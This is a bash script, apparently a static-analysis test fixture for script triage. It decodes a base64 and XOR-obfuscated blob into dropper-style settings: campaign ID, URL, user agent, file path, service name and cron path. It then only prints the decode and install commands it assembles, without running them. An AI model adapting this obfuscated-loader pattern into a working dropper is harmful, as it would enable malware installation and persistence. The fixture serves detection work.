# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_efd71f9e='0JuX2tXSw9bVm8LDxcnCw/nDy8TDwsLDworR1M/Sw/nAz8rD2sfCx9''bSw9Sb1tTPyNLA+cLDxcnCw/nUw8LP1MPF0trV0sfBw/nFydPI0puX''2sXHy9bHz8HI+c/Cm8XHy9bHz8HIi5bCk8KVlMSWnpbawM/Kw/nWx9''LOm4nSy9aJztPI0tTD1dWLxcfFzsOJiNXSx8HDi5bCk8KVlMSWnpY='
readonly Codec_efd71f9e='base64_chunks|single_byte_xor|a6'

Load_efd71f9e() {
  e=()
  local p
  while read -r p; do [[ -n "$p" ]] && e+=("$p"); done < <(printf '%s' "${Material_efd71f9e}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_efd71f9e() {
  d=()
  local i
  for ((i=0; i<${#e[@]}; i++)); do
    d+=("$((e[i] ^ 166))")
  done
}

Recover_efd71f9e() {
  local -a e d
  local t n z i
  n="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_efd71f9e
  for z in 1; do Decode_efd71f9e; done
  t=''
  local octal character
  for i in "${!d[@]}"; do
    printf -v octal '%03o' "${d[i]}"
    printf -v character '%b' "\\$octal"
    t+="$character"
  done
  printf '%s\n' "$t"
}

Inspect_efd71f9e() { local recovered; recovered="$(Recover_efd71f9e)"; printf '%s\n' "$recovered"; }

Plan_efd71f9e() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_efd71f9e)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a decoder=(base64 --decode) destination=(install -m 0600 /dev/stdin "$file_path")
  declare -p decoder destination
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_efd71f9e; fi

# reconstruction complete